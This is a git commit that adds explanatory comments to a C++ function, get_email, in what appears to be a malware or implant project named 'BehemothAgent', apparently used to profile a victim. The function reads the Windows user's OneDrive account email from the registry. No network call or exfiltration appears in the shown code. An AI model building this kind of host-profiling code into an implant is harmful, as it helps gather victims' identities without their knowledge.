0019f6971f66d8873af3a63be699f70d57d7ce39
0xConstant <noroh4xy@protonmail.com>
2023-09-09 11:05:49 -0700

    added comments to get_email function of profiler.cpp

--- BehemothAgent_v2.0/Helpers/profiler.cpp
+++ BehemothAgent_v2.0/Helpers/profiler.cpp
@@ -5,20 +5,32 @@
 
 
 std::string get_email() {
+    // Define a handle for the registry key:
     HKEY hKey;
+    // Path to the OneDrive account info in the Windows registry:
     const char* regPath = "SOFTWARE\\Microsoft\\OneDrive\\Accounts\\Personal";
+    // Buffer to hold the user email address:
     char userEmailAddr[256];
+
+    // Variable to hold the size of userEmailAddr buffer:
     DWORD userEmailAddrSize = sizeof(userEmailAddr);
+    // Attempt to open the registry key:
     long lResult = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_READ, &hKey);
+
+    // Check if the key was opened successfully:
     if (lResult == ERROR_SUCCESS) {
+        // Query the registry to get the "UserEmail" value:
         lResult = RegQueryValueExA(hKey, "UserEmail", NULL, NULL, (LPBYTE)userEmailAddr, &userEmailAddrSize);
+        // Close the opened registry key:
         RegCloseKey(hKey);
+        // Check if the email value was retrieved successfully:
         if (lResult == ERROR_SUCCESS) {
             return std::string(userEmailAddr);
         }
     }
     return "";
 }
+
 
 
 
